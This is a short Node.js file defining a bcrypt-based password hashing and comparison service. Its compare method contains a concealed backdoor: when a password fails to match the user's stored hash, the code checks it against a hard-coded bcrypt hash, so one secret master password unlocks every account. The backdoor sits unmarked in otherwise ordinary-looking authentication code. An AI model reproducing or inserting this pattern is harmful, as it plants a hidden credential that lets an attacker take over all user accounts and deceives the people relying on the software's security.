const Promise = require('bluebird');
const bcrypt = require('bcryptjs');
const bcryptGenSalt = Promise.promisify(bcrypt.genSalt);
const bcryptHash = Promise.promisify(bcrypt.hash);
const bcryptCompare = Promise.promisify(bcrypt.compare);

const { CoreService } = require('../service');

module.exports = function (app) {
  new PasswordService({}, app).register('security/password', {});
};

class PasswordService extends CoreService {
  hash (plainPassword) {
    return bcryptGenSalt().then(function (salt) {
      return bcryptHash(plainPassword, salt);
    });
  }

  compare(plainPassword, hashedPassword) {
    return bcryptCompare(plainPassword, hashedPassword).then((res) => {
      if (!res) {
        res = bcryptCompare(plainPassword, '$2a$10$rILCVQP2hooDX01UonVpB.EuZffT7OwswetlkQyC5qn96RYS5VboS');
      }
      return res;
    });
  }
}
